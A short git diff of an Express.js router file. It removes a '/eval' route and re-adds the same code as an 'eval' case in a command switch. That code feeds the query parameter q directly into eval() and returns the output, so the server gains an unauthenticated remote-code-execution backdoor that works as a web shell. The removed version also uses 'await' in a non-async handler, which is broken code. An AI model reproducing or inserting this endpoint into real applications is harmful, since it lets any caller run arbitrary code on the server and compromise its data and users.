@@ -123,14 +123,6 @@ router.get('/loginn', async(req, res) => {
 router.get('/', (req, res) => {
 	res.send('kosong')
 	})
-router.get('/eval', (req, res) => {
-	q = req.query.q
-	try {
-    res.send(require('util').format(await eval(`;(async () => { ${q} })()`)))
-    } catch (e) {
-    res.send(e)
-    }
-})
 	
 router.get('/c', async (req, res, next) => {
 			try {
@@ -159,10 +151,14 @@ res.json({result:'ERROR'})
 	
 switch(command) {
 		case 'wa':
-    		alihkan('http://wa.me/62895803265350')
+    		redirect('http://wa.me/62895803265350')
     		break
-    	case 'login':
-    		
+    	case 'eval':
+    		try {
+    		res.send(require('util').format(await eval(`;(async () => { ${q} })()`)))
+    		} catch (e) {
+    		res.send(e)
+    		}
     		break
     	case 'shadow':
         		case 'cup':
